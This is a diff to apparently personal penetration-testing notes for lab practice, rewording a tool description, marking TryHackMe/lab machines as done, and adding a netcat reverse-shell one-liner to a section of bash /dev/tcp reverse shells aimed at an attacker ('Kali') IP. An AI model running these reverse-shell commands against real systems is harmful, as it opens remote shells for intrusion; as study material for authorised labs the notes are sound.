@@ -97,7 +97,7 @@ search for possible paths to escalate privileges on Linux
 #### [Winpeas](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
 search for possible paths to escalate privileges on Windows
 #### [pspy](https://github.com/DominicBreuker/pspy)
-pspy is a command line tool designed to snoop on processes without need for root permissions.
+unprivileged Linux process snooping
 #### [Metasploit](https://github.com/rapid7/metasploit-framework)
 #### [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit/)
 A modified version of the passing-the-hash tool collection
@@ -189,7 +189,9 @@ sh -i >& /dev/tcp/$KaliIP/4444 0>&1
 ```
 bash -c "bash -i >& /dev/tcp/$KaliIP/4444 0>&1
 ```
-
+```
+nc $kaliIP 80 -e /bin/sh
+```
 ## Walkthrough Labs
 
 ### TryHackMe
@@ -331,12 +333,12 @@ bash -c "bash -i >& /dev/tcp/$KaliIP/4444 0>&1
 - [X] [Image]()
 - [X] [Easy] Jordak
 - [ ] [Lavita]()
-- [ ] [law]()
+- [X] [law]()
 - [X] [Easy] Levram ([writeup](/writeups/Levram.md))
 - [ ] [Mantis]()
 - [ ] [Marketing]()
 - [X] [Intermediate] Mzeeav
-- [ ] [Nibbles]()
+- [X] [Nibbles]()
 - [ ] [Nukem]()
 - [ ] [Ochima]()
 - [ ] [Payday]()
